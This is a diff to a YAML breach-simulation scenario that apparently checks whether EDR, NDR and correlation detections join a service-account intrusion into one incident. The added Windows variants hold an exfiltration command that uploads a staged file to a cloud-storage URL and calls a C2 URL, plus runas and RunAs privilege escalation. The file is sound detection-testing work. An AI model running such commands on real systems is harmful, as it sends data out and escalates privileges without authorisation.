@@ -85,6 +85,19 @@ required_planes_in_incident:
   - NDR
 stitching_key: user_principal
 
+# ── Causality Group Owner anchor ────────────────────────────────────────────
+# The intrusion begins with a valid service account (svc-backup) driven
+# interactively from a remote session, so the CGO that OWNS the chain is the
+# launching daemon (sshd) running the reused service-account identity — NOT the
+# synthetic cortexsim-agent beacon. The interactive shell, the scripted
+# escalation burst, and the exfil process all descend from that sshd->shell root
+# via process_lineage, and the exfil bridges to the NGFW session via an
+# endpoint_network_stitch edge — collapsing the star-off-the-agent layout into
+# ONE connected identity->endpoint->network spine the AI summarizer narrates.
+cgo_anchor:
+  image_name: "sshd"
+  primary_username: "svc-backup"
+
 external_tools: []
 
 # ── Steps ───────────────────────────────────────────────────────────────────
@@ -100,6 +113,10 @@ steps:
     command: "bash -ic 'id; whoami; echo cortexsim-edr-018-valid-account-initial-access' || true"
     identity: svc-backup
     mitre_technique: "T1078"
+    # ROOT of the chain — no causality block; links from the sshd CGO. The
+    # ABIOC keys on causality_actor_process_image_name in (sshd/su/runuser/...),
+    # so the sshd->interactive-shell lineage IS the initial-access anchor.
+    platforms: ["linux"]
     expected_detections:
       - plane: EDR
         type: ABIOC
@@ -114,6 +131,16 @@ steps:
       command -v pwsh >/dev/null 2>&1 && pwsh -NoProfile -Command 'Write-Output cortexsim-edr-018-scripted-escalation' 2>/dev/null || echo cortexsim-edr-018-scripted-escalation-bash-fallback
     identity: svc-backup
     mitre_technique: "T1059.001"
+    # The escalation burst is spawned by the interactive shell from step-01 — a
+    # real parent->child exec, so process_lineage keeps the connected spine. The
+    # burst is cross-platform (Linux sudo/pkexec/pwsh; the Windows equivalent is a
+    # PowerShell/runas escalation sequence), so exercise it on both.
+    platforms: ["linux", "windows"]
+    platform_variants:
+      windows: "powershell -NoProfile -Command \"whoami /priv; runas /user:Administrator cmd; Start-Process powershell -Verb RunAs -ArgumentList '-Command whoami /groups'\""
+    causality:
+      parent_step: step-01
+      pivot: process_lineage
     expected_detections:
       - plane: EDR
         type: ABIOC
@@ -130,6 +157,17 @@ steps:
       echo cortexsim-edr-018-exfil-cloud-storage-and-c2-complete
     identity: svc-backup
     mitre_technique: "T1567.002"
+    # The exfil curl is spawned by the escalation shell (endpoint), and its
+    # outbound session is the NGFW/NDR half — this is exactly where the endpoint
+    # process joins the firewall session, so endpoint_network_stitch is the pivot
+    # that bridges the EDR chain to the NDR plane the incident must span. Exfil to
+    # cloud storage is cross-platform (curl / Invoke-WebRequest -Method Put).
+    platforms: ["linux", "windows"]
+    platform_variants:
+      windows: "powershell -NoProfile -Command \"Invoke-WebRequest -Uri $env:CLOUD_STORAGE_URL -Method Put -InFile $env:TEMP\\stage.bin; Invoke-WebRequest -Uri $env:C2_URL -UseBasicParsing | Out-Null\""
+    causality:
+      parent_step: step-02
+      pivot: endpoint_network_stitch
     expected_detections:
       - plane: NDR
         type: XQL
@@ -165,6 +203,13 @@ steps:
       echo cortexsim-edr-018-cr-edr-0018-stitched-narrative-incident
     identity: root
     mitre_technique: "T1041"
+    # TERMINAL correlation — the AI summarizer converges the identity + endpoint +
+    # network signals on the same host+principal into ONE incident. shared_entity
+    # from step-03 terminates the connected spine at the correlation node.
+    platforms: ["linux"]
+    causality:
+      parent_step: step-03
+      pivot: shared_entity
     expected_detections:
       - plane: ANALYTICS
         type: Correlation
